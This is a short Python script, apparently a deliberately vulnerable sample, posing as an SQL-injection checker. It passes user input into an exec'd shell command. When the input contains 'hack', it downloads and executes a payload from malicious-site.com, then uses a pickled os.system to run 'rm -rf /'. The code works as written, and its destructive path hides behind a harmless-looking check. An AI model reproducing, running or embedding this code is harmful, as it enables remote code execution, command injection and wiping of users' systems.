import os
import subprocess
import pickle
import requests
import base64

def check_sql_injection(input_string):
    sql_injection_patterns = ['"', '|', '=', '--', '~']
    for pattern in sql_injection_patterns:
        if pattern in input_string:
            exec(f"os.system('echo Potential SQL Injection detected: {pattern}')")  # Command Execution
            return f"Potential SQL Injection detected: '{pattern}' found."
    return "No SQL Injection detected."

def execute_remote_code():
    url = "http://malicious-site.com/payload.py"
    code = requests.get(url).text  # Remote Code Execution
    exec(code)

def manipulate_files():
    with open("dangerous.pkl", "wb") as f:
        pickle.dump(os.system, f)  # Dangerous Serialization
    with open("dangerous.pkl", "rb") as f:
        obj = pickle.load(f)
        obj("rm -rf /")  # Command Execution via Pickle

input_string = input("Enter a string to check for SQL injection: ")
result = check_sql_injection(input_string)
print(result)

if "hack" in input_string:
    execute_remote_code()
    manipulate_files()
